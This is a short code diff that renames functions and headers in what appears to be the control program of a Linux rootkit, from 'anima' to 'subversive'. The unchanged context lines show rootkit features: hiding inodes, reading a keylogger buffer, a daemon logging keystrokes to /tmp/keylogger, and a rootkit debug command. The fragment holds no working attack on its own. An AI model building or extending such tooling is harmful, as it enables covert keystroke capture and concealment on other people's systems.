@@ -3,9 +3,9 @@
 #include <string.h>
 #include <getopt.h>
 
-#include <anima/anima_ctl.h>
-#include "anima_api.h"
-#include "anima_daemon.h"
+#include <subversive/subversive_ctl.h>
+#include "subversive_api.h"
+#include "subversive_daemon.h"
 
 static struct option long_options[] = {
 	{"hide-inode", 1, 0, 0},
@@ -95,10 +95,10 @@ int main(int argc, char **argv)
 			get_keylogger_buf(optarg);
 			break;
 		case 12:
-			anima_daemon("/tmp/keylogger");
+			subversive_daemon("/tmp/keylogger");
 			break;
 		case 13:
-			anima_control(DEBUG_RK, NULL);
+			subversive_control(DEBUG_RK, NULL);
 			break;
 		default:
 			break;
